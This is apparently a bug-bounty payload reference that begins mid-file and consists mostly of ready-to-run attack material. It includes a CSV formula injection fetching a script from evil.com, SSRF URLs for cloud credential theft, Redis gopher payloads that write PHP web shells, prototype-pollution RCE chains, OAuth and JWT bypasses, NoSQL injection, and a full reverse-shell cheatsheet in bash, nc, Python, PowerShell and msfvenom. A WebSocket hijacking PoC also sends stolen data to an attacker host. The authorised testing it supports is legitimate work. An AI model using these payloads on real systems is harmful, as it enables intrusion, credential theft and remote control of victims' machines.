=cmd|'/C powershell IEX(wget evil.com/s.ps1)'!A1
```

### Injection points
User-supplied fields that end up in CSV/XLSX exports: profile name, address, company, invoice memo, comment, support tickets, referral codes.

---

## Subdomain Takeover Fingerprints

### Quick lookup table
| Service            | CNAME pattern / fingerprint                                               | Claim |
|--------------------|---------------------------------------------------------------------------|-------|
| AWS S3             | `NoSuchBucket` / `The specified bucket does not exist`                    | Create bucket with same name |
| AWS CloudFront     | `ERROR: The request could not be satisfied` + `Bad request`               | Claim distribution |
| Azure (various)    | `*.azurewebsites.net`, `*.cloudapp.net`, `*.trafficmanager.net` → 404     | Create resource with same name |
| GitHub Pages       | `There isn't a GitHub Pages site here`                                    | Create repo + pages |
| GitLab Pages       | `The page you're looking for could not be found` on `*.gitlab.io`         | Create namespaced repo |
| Heroku             | `No such app` / `herokuapp.com`                                           | Claim app |
| Shopify            | `Sorry, this shop is currently unavailable` on `*.myshopify.com`          | Claim store |
| Fastly             | `Fastly error: unknown domain`                                            | Add domain to Fastly svc |
| Zendesk            | `Help Center Closed` on `*.zendesk.com`                                   | Claim subdomain |
| Tumblr             | `Whatever you were looking for doesn't currently exist`                   | Claim blog |
| WordPress.com      | `Do you want to register *.wordpress.com?`                                | Register site |
| Ghost              | `The thing you were looking for is no longer here` / `domain error`       | Claim Ghost blog |
| Surge              | `project not found` on `*.surge.sh`                                       | `surge` publish |
| Unbounce           | `The requested URL was not found on this server`                          | Claim page |
| Pantheon           | `The gods are wise, but do not know of the site which you seek`           | Claim site |
| Webflow            | `The page you are looking for doesn't exist or has been moved` + Webflow  | Claim site |
| Tilda              | `Please renew your subscription`                                          | Claim |
| Intercom           | `Uh oh. That page doesn't exist.` on `*.custom.intercom.help`             | Claim Messenger |
| Help Scout         | `No settings were found for this company`                                 | Claim |
| Readme.io          | `Project doesnt exist... yet!`                                            | Claim |
| Statuspage         | `You are being redirected` → `pagenotfound`                               | Claim |
| Teamwork           | `Oops - We didn't find your site`                                         | Claim |
| Acquia             | `The site you are looking for could not be found`                         | Claim |
| Bitbucket          | `Repository not found`                                                    | Claim repo |
| Cargo Collective   | `If you're moving your domain away from Cargo you must...`                | Claim |
| Smartling          | `Domain is not configured`                                                | Claim |
| Uservoice          | `This UserVoice subdomain is currently available!`                        | Claim |
| JetBrains          | `is not a registered InCloud YouTrack`                                    | Claim |
| Desk               | `Please try again or try Desk.com free for 14 days`                       | Claim |
| Feedpress          | `The feed has not been found`                                             | Claim |
| Tictail            | `to target URL: <a href="https://tictail.com">`                           | Claim |
| Launchrock         | `HTTP/1.1 500 Internal Server Error` + launchrock signature               | Claim |

### Detection one-liner
```bash
subfinder -d target.com -silent | dnsx -silent -cname -resp | \
  grep -iE 's3|cloudfront|herokuapp|github\.io|azurewebsites|cloudapp|trafficmanager|myshopify|zendesk|fastly|wordpress|ghost\.io|surge\.sh|tumblr|webflow|statuspage|readme\.io' | tee takeover_candidates.txt

# Validate each
while read line; do
  host=$(echo $line|awk '{print $1}')
  curl -sk "https://$host/" | \
    grep -iEo 'NoSuchBucket|There isn.t a GitHub Pages|No such app|Sorry, this shop|Fastly error|Help Center Closed|domain error|project not found|Pantheon' \
    && echo "[TAKEOVER] $host"
done < takeover_candidates.txt
```

---

## SSRF — Cloud Metadata Endpoints

### AWS IMDSv1 (unauthenticated)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/api/token  (POST, produces v2 token)
```

### AWS IMDSv2 (requires token)
```bash
T=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $T" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
IMDSv2 PUT is often blocked by SSRF filters → try it anyway; some proxies allow PUT.

### AWS IP/bypass variants
```
http://[::ffff:169.254.169.254]/latest/meta-data/
http://2852039166/latest/meta-data/
http://0251.0376.0251.0376/latest/meta-data/
http://0xA9FEA9FE/latest/meta-data/
http://169.254.169.254.nip.io/latest/meta-data/
http://metadata.google.internal.nip.io
http://burp-collab-subdomain.oastify.com/...@169.254.169.254/
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  (header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata/computeMetadata/v1/instance/attributes/kube-env
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  (header: Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Kubernetes
```
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
http://kubernetes/api/v1/namespaces/kube-system/secrets
http://127.0.0.1:10250/pods               (kubelet, often unauth)
http://127.0.0.1:10255/pods               (read-only kubelet)
http://127.0.0.1:6443/api/v1/nodes
```
Use in-pod JWT: `/var/run/secrets/kubernetes.io/serviceaccount/token`.

### Digital Ocean / Oracle / Alibaba / Hetzner
```
http://169.254.169.254/metadata/v1.json                    (DO)
http://169.254.169.254/opc/v1/instance/                    (Oracle)
http://100.100.100.200/latest/meta-data/                   (Alibaba)
http://169.254.169.254/hetzner/v1/metadata                 (Hetzner)
http://169.254.169.254/v1/                                 (Packet/Equinix)
```

### Redis / Memcached (gopher)
```
gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20x%20%22<?php system($_GET[c]);?>%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A
```

### SSRF bypass tricks
```
http://localhost#@evil.com
http://evil.com@127.0.0.1
http://127.1
http://0/
http://[::]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://127.0.0.1.nip.io
http://localtest.me
http://spoofed.burpcollaborator.net
http://127.0.0.1%09
http://127.0.0.1%00.evil.com
http://evil.com%2F@127.0.0.1
http://127。0。0。1                            (ideographic full stop)
http://①②⑦.⓪.⓪.①                             (enclosed digits)
http://127.0.0.1:80+&@evil.com:80#@target.com
```

---

## Mass Assignment / HTTP Parameter Pollution

### Mass assignment probes
Append these to any `POST /user`, `PATCH /profile`, `PUT /account`:
```json
{"role":"admin"}
{"isAdmin":true}
{"is_admin":1}
{"admin":true}
{"adminRole":true}
{"userRole":"admin"}
{"permissions":["*"]}
{"scope":"admin"}
{"groups":["admin","superuser"]}
{"emailVerified":true}
{"verified":true}
{"trusted":true}
{"balance":999999}
{"credits":999999}
{"subscriptionTier":"enterprise"}
{"plan":"premium"}
{"organizationId":"<other-org-uuid>"}
{"ownerId":"<victim-uuid>"}
{"password":"x","passwordResetToken":"known"}
```

### HPP — duplicate parameters
```
?role=user&role=admin
?id=1&id=2
POST body: role=user&role=admin
```
Server behavior differs: PHP → last wins, ASP.NET → comma-join, Node `qs` → array.

### JSON key duplication
```json
{"role":"user","role":"admin"}
{"id":1,"id":2}
```
Different parsers pick different values; can bypass validation that inspects first key.

### Array/object coercion
```
?role[]=admin
?role[role]=admin
?filter[isAdmin]=true
?user.isAdmin=true
```

---

## Server-Side Prototype Pollution

### Lodash / merge-deep gadgets
```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"__proto__":{"toString":"polluted"}}
{"__proto__":{"polluted":"yes"}}
```

### RCE chains (when Handlebars / EJS / Pug template engine present)
Handlebars:
```json
{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":0,"params":[{"type":"NumberLiteral","value":"process.mainModule.require('child_process').execSync('id')"}],"loc":{"start":0,"end":0}}]}}
```

Pug (via polluted compile options):
```json
{"__proto__":{"block":{"type":"Text","line":"","val":"a","nodes":[]},"content":"process.mainModule.require('child_process').execSync('id').toString()"}}
```

### Detection probes (black-box)
```
GET /?__proto__[polluted]=yes
GET /?constructor[prototype][polluted]=yes
POST {"__proto__":{"polluted":"yes"}}
```
Then GET a normal endpoint and check response JSON for `polluted:"yes"` echoed back in unrelated objects.

### Client-side (for reference — pairs with DOM XSS)
```
location.hash: #__proto__[innerHTML]=<img src=x onerror=alert(1)>
querystring:   ?__proto__[src]=javascript:alert(1)
```

---

## GraphQL — Extended

### Introspection (when disabled, try field suggestions)
```
query { __schema { types { name } } }
{ query: "{ us" }          → "Did you mean 'user'?" error leaks field names
{ query: "{ user { i" }     → leaks "id", "isAdmin", …
```

### Suggestion-driven enumeration (clairvoyance)
```bash
# Feed type name, capture "Did you mean" suggestions to build schema
python3 -m graphql-cop -t https://target.com/graphql
python3 clairvoyance.py -o schema.json https://target.com/graphql
```

### Alias-based batching (bypass rate limits, brute force)
```json
{"query":"{
  a1: login(u:\"admin\",p:\"pass1\"){token}
  a2: login(u:\"admin\",p:\"pass2\"){token}
  a3: login(u:\"admin\",p:\"pass3\"){token}
}"}
```

### Complexity DoS
```
{ users { posts { comments { author { posts { comments { author { ...100 deep... } } } } } } } }
```
Or circular:
```
fragment F on User { friends { ...F } }
{ user(id:1) { ...F } }
```

### Directive abuse
```
query @skip(if:false) { ... }
query @include(if:true) { ... }
query { __type(name:"User") @include(if:true) { fields { name } } }
```

### CSRF on GraphQL
```
POST /graphql
Content-Type: application/x-www-form-urlencoded
query=query%7Bme%7Bemail%7D%7D
```
Form-encoded body = no pre-flight → CSRF if no token.

### IDOR / auth-bypass vectors
```
{ user(id:"<victim-id>") { email phone ssn } }
mutation { updateUser(id:"<victim-id>", role: ADMIN) { id } }
{ _entities(representations:[{__typename:"User",id:"<victim-id>"}]) { ... on User { email } } }
```

---

## OAuth — Extended

### Authorization request tampering
```
response_type=token id_token    → implicit, exfil via fragment
response_type=code token        → hybrid, bypass some PKCE
prompt=none                     → silent auth, chain with open redirect
redirect_uri=https://evil.com/  → if not strictly matched
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com/redirect?url=https://evil.com
redirect_uri=https://target.com/%23@evil.com
redirect_uri=https://target.com/%2F..%2F@evil.com
scope=openid email profile admin   → scope escalation
```

### `state` parameter flaws
- `state` missing → CSRF on login / account linking
- `state` not validated server-side
- Same `state` accepted twice (replay)
- `state` predictable (timestamp, counter)

### PKCE bypass
- `code_verifier` not checked on callback
- Downgrade: omit `code_challenge` on auth req → some servers don't require verifier
- Fixed verifier: client allows `code_challenge_method=plain` and reflects

### OIDC `alg:none`
```
{"alg":"none","typ":"JWT"}.{"sub":"admin","email":"admin@t"}.
```
Variants:
```
alg: None
alg: NONE
alg: nONe
```

### Key confusion (RS256 → HS256)
Sign the JWT with the server's public RSA key as the HMAC secret.

### Client confusion / cross-client
```
# Auth code obtained for client A, redeem at client B's callback
POST /token
client_id=B&code=<A's code>&redirect_uri=<B's redirect>
```

### Account linking takeover
```
/oauth/link?provider=google&code=<victim's google code>
```
If endpoint doesn't bind to session → attacker links victim's social account to attacker's local account → login as victim.

### Dynamic client registration abuse
```
POST /oauth/register
{"redirect_uris":["https://evil.com/cb"],"client_name":"x"}
```
If enabled publicly → attacker registers a client in the trusted authorization server.

---

## Sensitive Files / Discovery Paths

### Common exposures
```
/.git/config
/.git/HEAD
/.git/index
/.gitignore
/.svn/entries
/.hg/store
/.env
/.env.local
/.env.production
/.env.staging
/.env.bak
/backup.zip
/backup.sql
/db.sql
/database.sql
/dump.sql
/site.tar.gz
/www.zip
/config.json
/config.yml
/config.yaml
/secrets.json
/credentials
/docker-compose.yml
/Dockerfile
/.dockerignore
/docker-compose.override.yml
/kustomization.yaml
/values.yaml                       (Helm)
/chart.yaml
/appsettings.json                  (.NET)
/web.config
/.htaccess
/.htpasswd
/phpinfo.php
/info.php
/test.php
/debug
/actuator
/actuator/env
/actuator/heapdump
/actuator/mappings
/actuator/threaddump
/actuator/prometheus
/actuator/loggers
/actuator/httptrace
/actuator/metrics
/actuator/beans
/server-status                     (Apache)
/server-info
/metrics                           (Prometheus)
/health
/healthz
/readyz
/livez
/swagger.json
/swagger.yaml
/v2/api-docs
/v3/api-docs
/api-docs
/openapi.json
/graphql
/graphiql
/.well-known/security.txt
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/robots.txt
/sitemap.xml
/crossdomain.xml
/clientaccesspolicy.xml
/package.json
/package-lock.json
/yarn.lock
/composer.json
/composer.lock
/Gemfile
/Gemfile.lock
/requirements.txt
/pyproject.toml
/go.mod
/go.sum
/pom.xml
/build.gradle
/CHANGELOG
/README.md
/.ds_store
/.idea/workspace.xml
/.vscode/settings.json
/Thumbs.db
/error_log
/debug.log
```

### Backup-file brute
```bash
for ext in bak bak1 old orig save swp tmp tar.gz tar.bz2 zip 7z rar ~ _bak copy; do
  for f in index.php login.php config.php wp-config.php settings.php .env database.sql; do
    curl -skI "https://target.com/$f.$ext" -o /dev/null -w "%{http_code} $f.$ext\n"
  done
done | grep -v 404
```

### Git dump
```bash
git-dumper https://target.com/.git/ ./dump
# or manually
curl -so HEAD https://t/.git/HEAD
git init && curl -so .git/config https://t/.git/config
# then walk refs and objects
```

---

## NoSQL Injection — Beyond Mongo

### Elasticsearch
```
GET /_cluster/health
GET /_cat/indices
GET /_search?q=*:*
GET /<index>/_search?q=password:*
POST /<index>/_search {"query":{"match_all":{}}}

# Groovy scripting (old ES)
POST /_search
{"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec(\"id\")"}}}

# Painless (newer)
{"script_fields":{"x":{"script":{"lang":"painless","source":"Runtime.getRuntime().exec('id')"}}}}
```

### CouchDB
```
GET /_all_dbs
GET /_users/_all_docs?include_docs=true
GET /_config                    (< 3.x)
PUT /_users/org.couchdb.user:attacker  {"type":"user","name":"attacker","roles":["_admin"],"password":"x"}
```

### Redis
```
INFO
CONFIG GET *
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET[c]); ?>"
SAVE
KEYS *
```
Via gopher SSRF:
```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp%0D%0ACONFIG%20SET%20dbfilename%20x%0D%0ASAVE
```

### Cassandra / CQL
```
' OR '1'='1
'; DROP TABLE users; --
' ALLOW FILTERING --
```
(Cassandra has limited injection surface — parameter binding is strict; focus on ORM misuse.)

### DynamoDB (via AWS SDK misuse)
```
FilterExpression=": = : "
# Operator injection: app concatenates user input into FilterExpression
```

### Neo4j / Cypher
```
' OR 1=1 //
' UNION MATCH (n) RETURN n //
'; MATCH (n) DETACH DELETE n; //
' RETURN 1 CALL dbms.security.listUsers() //
```

---

## Reverse Shells Cheatsheet

LHOST/LPORT = attacker listener. Use `nc -lvnp 4444` or `rlwrap nc -lvnp 4444` to catch.

### Bash
```
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196
```

### /dev/tcp (no bash)
```
sh -i 5<> /dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5
```

### nc
```
nc -e /bin/sh LHOST LPORT
nc LHOST LPORT -e /bin/sh
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f
ncat --ssl LHOST LPORT -e /bin/bash
```

### Python
```python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Perl
```
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```
php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### PowerShell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### PowerShell (b64 one-liner)
```
powershell -nop -w hidden -e <base64>
```
Generate:
```bash
cmd='$c=New-Object Net.Sockets.TCPClient("LHOST",LPORT);...'
echo -n "$cmd" | iconv -t UTF-16LE | base64 -w0
```

### msfvenom
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o s.exe
msfvenom -p php/reverse_php LHOST=1.2.3.4 LPORT=4444 -f raw -o s.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f raw -o s.jsp
msfvenom -p cmd/unix/reverse_bash LHOST=1.2.3.4 LPORT=4444 -f raw
```

### Stabilize TTY
```
python -c 'import pty;pty.spawn("/bin/bash")'
# then in reverse shell:
export TERM=xterm-256color
# Ctrl-Z, then locally:
stty raw -echo; fg
# Ctrl-L to redraw
```

### TLS/SSL shells (bypass IDS)
```
# Attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=x"
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
# Victim
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect LHOST:4444 > /tmp/s; rm /tmp/s
```

### Socat (fully interactive)
```
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444
```

---

## WebSocket Attacks

### Cross-Site WebSocket Hijacking (CSWSH)
If WS auth relies on cookies and no origin check:
```html
<script>
let ws = new WebSocket('wss://target.com/socket');
ws.onopen = () => ws.send('{"action":"getBalance"}');
ws.onmessage = e => fetch('https://evil.com/?d='+btoa(e.data));
</script>
```
PoC page loaded in victim browser → attacker-owned origin initiates authenticated WS with `Cookie:` header attached automatically.

### Origin bypass probes
```
Origin: null
Origin: https://target.com.evil.com
Origin: https://evil.com
(no Origin)
```

### Injection over WS
JSON messages are often deserialized with less validation than HTTP:
```json
{"action":"login","user":"admin'--","pass":"x"}
{"action":"query","q":"{__schema{types{name}}}"}
{"__proto__":{"isAdmin":true}}
```

### DoS
Rapid-fire binary/text frames, or send a single very large frame (`2^30` bytes) to blow up buffers.

---

## SMTP / Email Header Injection

### Payloads (in user-controlled From/Subject/Name fields)
```
victim@t.com%0aBcc:attacker@evil.com
victim@t.com%0d%0aBcc:attacker@evil.com
victim@t.com%0aContent-Type:text/html%0d%0a%0d%0a<h1>phish</h1>
victim@t.com%0aSubject:Overwritten
"name\r\nBcc: attacker@evil.com"
```

### Impact
- BCC exfil — attacker receives copies of outbound mail (password resets, invoices)
- Spoofed `Reply-To`
- HTML body override via injected `Content-Type`
- Break MIME boundary → attach arbitrary file

### Test quickly
Account signup / "Contact Us" / "Invite a friend" / password reset — anywhere a name/email is echoed into generated email. Send payload, check mailbox.

---

## Business-Logic Quantity / Price Manipulation

### Integer-limit probes
```
quantity=0
quantity=-1
quantity=0.0001
quantity=1e10
quantity=9999999999
quantity=2147483648            (int32 overflow)
quantity=9223372036854775808   (int64 overflow)
quantity=999999999999999999999999999999
price=-100
price=0.00
price=0.01                      (rounding)
price=999999999
amount=0
amount=NaN
amount=null
amount=[]
```

### Currency / unit confusion
```
{"amount":100,"currency":"USD"}    vs   {"amount":100,"currency":"IDR"}
{"amount":"100.00"}                 vs   {"amount":"100,00"}  (locale parse)
{"amount":"0.1"} + {"amount":"0.2"}  → 0.30000000000000004 float drift
```

### Coupon abuse
```
# Stack same code twice
coupon=SAVE10&coupon=SAVE10
# Race to redeem single-use
(seq 10 | xargs -P10 -I{} curl -s -X POST https://t/redeem -d 'code=SINGLE')
# Tamper applied percentage
{"couponCode":"SAVE10","discountPercent":100}
# Apply post-checkout
1. place order; 2. apply coupon to existing order
# Negative discount → add funds
{"couponCode":"SAVE10","amount":"-50"}
```

### Workflow bypass
```
# Skip payment step
POST /checkout/confirm        (without /checkout/pay)
# Replay success callback
POST /payment/callback status=success&order=123
# Re-use old order reference
{"orderId":"<already-paid-order>","action":"ship-to","address":"attacker"}
# Coupon applies to ineligible tier
{"plan":"free","coupon":"PRO-ONLY-50"}
```

### Refund / return abuse
- Refund item, keep item (return never inspected)
- Partial refund then full refund
- Refund to different payment method (attacker card)
- Race: refund + chargeback simultaneously

---

## Mobile Deep Link / Intent Hijacking

### Android — exported component probes
```bash
# Pull manifest
apktool d app.apk -o out/
grep -A2 'android:exported="true"' out/AndroidManifest.xml

# Common dangerous exports
<activity android:exported="true">      → launch with adb am start
<service  android:exported="true">      → bind with malicious IPC
<receiver android:exported="true">      → send broadcast
<provider android:exported="true">      → query/update content://
```

### ADB triggers
```bash
adb shell am start -a android.intent.action.VIEW -d "myapp://open?url=https://evil.com"
adb shell am start -n com.target/.WebViewActivity -e url "https://evil.com"
adb shell am start -n com.target/.InternalActivity --es token "STOLEN"
adb shell content query --uri content://com.target.provider/users
adb shell content insert --uri content://com.target.provider/users --bind role:s:admin
```

### Deep-link XSS / open-redirect in WebView
```
myapp://open?url=javascript:alert(1)
myapp://open?url=https://evil.com/phish
myapp://open?url=file:///data/data/com.target/shared_prefs/auth.xml
intent://x#Intent;scheme=http;package=com.target;S.url=https://evil.com;end
```

### Android App Link / Universal Link hijack
- `/.well-known/assetlinks.json` misconfig → any app claims the domain
- iOS `apple-app-site-association` over HTTP, missing `Content-Type`, or overly broad paths

### iOS URL scheme collision
```
# Attacker app registers same custom scheme as target
CFBundleURLSchemes = ("targetapp")
# iOS non-deterministic which app handles → phishing deep link
```

### Pending intent flaws (Android)
Implicit PendingIntent passed to third-party → attacker fills in component → elevation.

### WebView settings to check (static review)
```
setJavaScriptEnabled(true)
setAllowFileAccessFromFileURLs(true)
setAllowUniversalAccessFromFileURLs(true)
addJavascriptInterface(...)                   ← potential RCE if minSdk < 17
setAllowContentAccess(true)
setAllowFileAccess(true)
shouldOverrideUrlLoading → returns false / doesn't validate scheme
```

### Exfil via implicit intent
```
# App calls Intent.ACTION_VIEW with sensitive URL — attacker app intercepts
<intent-filter android:priority="999">
  <action android:name="android.intent.action.VIEW" />
  <data android:scheme="https" android:host="internal.target.com" />
</intent-filter>
```

## Info Disclosure — Secret / API-Key Regex Patterns

Use these against JS bundles, HTML, API responses, cookies, localStorage dumps,
sourcemaps, `.git` packed objects, and any crawled text. Source: extracted from
PageZero `sensitive_scan.js` (26 patterns). PCRE-compatible — use with
`grep -oP` or `rg -oP`. The ready-to-use one-per-line file lives at
`wordlists/secret-patterns.txt`.

### Pattern table

| Name | Regex | Notes |
|------|-------|-------|
| JWT | `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}` | Three-part base64url — also matches Azure/MSAL tokens |
| AWS Access Key | `AKIA[0-9A-Z]{16}` | 20 chars total. ASIA/AGPA/AIDA also valid prefixes for other principal types |
| AWS Secret | `(?i)(?:aws.?secret\|SecretAccessKey)[^A-Za-z0-9/+=]*([A-Za-z0-9/+=]{40})` | Context-based; 40-char base64 |
| Bearer Token | `(?i)Bearer\s+([A-Za-z0-9_\-\.]{20,})` | HTTP header form |
| Basic Auth | `Basic\s+([A-Za-z0-9+/]{16,}={0,2})` | base64 `user:pass` |
| Private Key | `-----BEGIN (?:RSA \|EC \|OPENSSH )?PRIVATE KEY-----` | PEM header |
| API Key (generic) | `(?i)(?:api[_-]?key\|x-api-key\|apikey)\s*[:=]\s*["']?([A-Za-z0-9_\-]{20,})["']?` | Context key=value |
| OAuth Token | `(?i)(?:access_token\|oauth_token)\s*[:=]\s*["']?([A-Za-z0-9_\-\.]{20,})["']?` | Context-based |
| Password Literal | `(?i)(?:password\|passwd\|secret)\s*[:=]\s*["']([^"']{6,})["']` | Hardcoded creds in JS/config |
| Discord Bot Token | `[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}` | Classic three-part |
| Stripe Key | `(?:sk\|pk)_(?:live\|test)_[A-Za-z0-9]{24,}` | `sk_live_` is critical |
| GitHub PAT | `ghp_[A-Za-z0-9]{36}\|github_pat_[A-Za-z0-9_]{82}` | Classic + fine-grained |
| Slack Token | `xox[bpsa]-[A-Za-z0-9\-]{10,}` | Bot/User/App/Legacy |
| Google OAuth | `(?i)(?:client_secret\|GOCSPX)[^A-Za-z0-9]*([A-Za-z0-9_\-]{20,})` | GOCSPX prefix on modern secrets |
| MSAL / Azure Token | `(?i)(?:msal\|azure)[^A-Za-z0-9]*(?:token\|secret\|key)\s*[:=]\s*["']?([A-Za-z0-9_\-\.]{20,})["']?` | Context-based |
| Twilio SID | `(?:AC\|SK)[a-f0-9]{32}` | Account SID or API Key SID |
| Twilio Auth Token | `(?i)(?:twilio)[^A-Za-z0-9]*(?:token\|secret\|auth)\s*[:=]\s*["']?([A-Za-z0-9]{32})["']?` | 32-hex auth token |
| SendGrid | `SG\.[A-Za-z0-9_\-]{22,}\.[A-Za-z0-9_\-]{22,}` | Three-part prefix `SG.` |
| Heroku API Key | `(?i)(?:heroku)[^A-Za-z0-9]*(?:api[_-]?key\|token)\s*[:=]\s*["']?([A-Za-z0-9\-]{36,})["']?` | UUID-shaped |
| Firebase Config | `(?i)(?:apiKey\|authDomain\|storageBucket\|messagingSenderId\|appId)\s*[:=]\s*["']([^"']{10,})["']` | Firebase web config dump |
| Shopify Token | `shp(?:pa\|at\|ca\|ss)_[A-Fa-f0-9]{32,}` | Private/Access/Custom/Shared |
| NPM Token | `npm_[A-Za-z0-9]{36}` | Automation/publish tokens |
| Mailgun | `key-[A-Za-z0-9]{32}` | Legacy key-prefixed |
| Square OAuth | `sq0[a-z]{3}-[A-Za-z0-9_\-]{22,}` | `sq0atp-`, `sq0csp-`, etc. |
| GitLab PAT | `glpat-[A-Za-z0-9_\-]{20}` | Project/personal access token |

### Usage — scan a single file or URL

```bash
# Single file
grep -oP -f wordlists/secret-patterns.txt app.js

# Crawled responses directory
rg -oP -f wordlists/secret-patterns.txt recon/<target>/responses/

# Live fetch + scan
curl -sL https://target.com/static/main.js | grep -oP -f wordlists/secret-patterns.txt

# All JS bundles from a katana crawl
cat recon/<target>/urls.txt | grep -E '\.js(\?|$)' \
  | xargs -P 10 -I{} sh -c 'curl -sL "{}" | grep -oPH "$(cat wordlists/secret-patterns.txt | tr "\n" "|")" | head -5'
```

### Impact notes

- `AKIA` + 40-char secret together = full AWS creds → Critical (always test with `aws sts get-caller-identity`)
- `sk_live_` Stripe, production GitHub PAT, private keys → Critical even alone
- Firebase `apiKey` alone is NOT a secret (public by design); only useful if paired with permissive rules — validate with `firebase-extractor` or read `/.json` root
- JWT / Bearer tokens — decode first (`jwt-cli`, `cyberchef`). Check `alg`, `exp`, role claims. Expired = informational.
- Client-only OAuth `client_id` is not a secret; only `client_secret` / GOCSPX matters

### Validation before reporting

1. **Test the key is live** — every paid secret report requires a working API call as PoC
2. **Check expiry** for JWTs (`exp` claim) — expired is often dupe/N/A
3. **Scope check** — make sure the leaking asset is in scope (not a third-party CDN that isn't part of the program)
4. **Rotate warning** — submit immediately, don't sit on prod creds

See `rules/never-submit.md` for the full never-submit list. Hardcoded
non-sensitive config values (public API keys, telemetry IDs, CDN URLs) are
informational and should NOT be submitted standalone.

## Supabase / PostgREST (RLS, Keys, RPC, Storage)

Full methodology: `skills/hunt-supabase/SKILL.md` (`supabase-hunter` agent).
Quick-reference payloads only — read the skill before testing, PostgREST's
filter grammar is easy to get subtly wrong from memory.

### Decode a key (classify anon vs service_role FIRST)

```bash
echo '<jwt>' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# "role": "anon"          -> expected client-side, not a finding alone
# "role": "service_role"  -> bypasses ALL RLS. Client-reachable = P0, stop here.
```

### RLS bypass matrix (run per table — enumerate ALL tables, not just one)

```bash
# Anon read
curl -s "$URL/rest/v1/<table>?select=*&limit=5" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Anon write (often forgotten even when read is locked down)
curl -s -X POST "$URL/rest/v1/<table>" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" -d '{"...":"..."}'

# Cross-user read — user A's token requesting user B's row
curl -s "$URL/rest/v1/<table>?id=eq.<victim-id>" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $USER_A_TOKEN"

# OR-filter bypass (PostgREST boolean-logic query grammar)
curl -s "$URL/rest/v1/<table>?or=(published.eq.true,published.eq.false)" \
  -H "apikey: $ANON_KEY"

# Embedded-resource join — read a locked table THROUGH a more permissive one
curl -s "$URL/rest/v1/<public_table>?select=*,<private_table>(*)" \
  -H "apikey: $ANON_KEY"
```

